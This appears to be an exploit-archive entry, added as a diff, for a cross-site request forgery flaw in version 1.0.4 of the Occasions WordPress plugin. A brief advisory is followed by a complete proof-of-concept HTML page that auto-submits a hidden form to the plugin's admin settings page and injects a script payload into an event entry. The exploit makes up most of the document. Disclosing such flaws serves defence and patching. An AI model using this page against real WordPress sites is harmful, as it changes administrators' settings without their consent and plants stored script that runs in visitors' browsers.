@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/58599/info
+
+The Occasions plugin for WordPress is prone to a cross-site request-forgery vulnerability because the application fails to properly validate HTTP requests.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.
+
+Occasions 1.0.4 is vulnerable; other versions may also be affected. 
+
+<html> <head><title>CSRF Occasions</title></head> <body> <!-- www.example.com:9001/wordpress --> <form action="http://127.0.0.1:9001/wordpress/wp-admin/options-general.php?page=occasions/occasions.php" method="POST"> <input type="hidden" name="action" value="saveoccasions" /> <input type="hidden" name="nodes[]" value="1" /> <input type="hidden" name="occ_title1" value="CSRF Vulnerability" /> <input type="hidden" name="occ_startdate1" value="18.03." /> <input type="hidden" name="occ_enddate1" value="28.03." /> <input type="hidden" name="occ_type1" value="1" /> <input type="hidden" name="occ_content1" value="<script>alert(1)</script>" /> <script>document.forms[0].submit();</script> </form> </body> </html> 
